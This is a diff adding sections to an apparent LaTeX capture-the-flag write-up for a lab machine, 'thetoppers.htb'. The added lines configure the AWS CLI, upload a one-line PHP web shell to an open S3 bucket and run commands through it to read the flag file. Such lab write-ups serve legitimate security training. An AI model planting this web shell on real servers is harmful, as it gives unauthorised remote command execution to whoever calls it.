@@ -22,6 +22,16 @@
   minted options={texcl=true},
   left=1mm,
 }
+\newtcblisting{html}{
+  listing engine=minted,
+  colback=bg,
+  colframe=black!70,
+  listing only,
+  minted style=borland,
+  minted language=html,
+  minted options={texcl=true},
+  left=1mm,
+}
 \newtcblisting{sql}{
   listing engine=minted,
   colback=bg,
@@ -798,9 +808,39 @@ Which command is used to set up the AWS CLI installation? \mintinline{bash}{aws 
 What is the command used by the above utility to list all of the S3 buckets? \mintinline{bash}{aws s3 ls}.
 
 This server is configured to run files written in what web scripting language? \mintinline{bash}{php}.
+\begin{bash}
+pacman -Ss amazon
+sudo pacman -S aws-cli
+aws configure
+\end{bash}
 
-\n
+Use fake values for the AWS account, since it does not matter.
+\begin{txt}
+AWS Access Key ID [None]: aSsad
+AWS Secret Access Key [None]: adsasd
+Default region name [None]: asdijigj
+Default output format [None]: idjoa
+\end{txt}
 
-\textbf{I STILL HAVE TO THINK AND SUBMIT ROOT FLAG}
+\begin{bash}
+aws s3 ls s3://thetoppers.htb
+Could not connect to the endpoint URL: "http://s3.a.amazonaws.com/thetoppers.htb"
+\end{bash}
+
+Modify the endpoint URL. Upload a simple PHP webshell \mintinline{bash}{shell.php}.
+\begin{session}
+$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
+$ echo "<?php system($_GET['cmd']); ?>" > shell.php
+$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
+\end{session}
+
+Next we go to the website with URL parameters:
+\begin{txt}
+http://thetoppers.htb/shell.php?cmd=ls
+images index.php shell.php
+http://thetoppers.htb/shell.php?cmd=ls ..
+flag.txt html
+http://thetoppers.htb/shell.php?cmd=cat ../flag.txt
+\end{txt}
 
 \end{document}
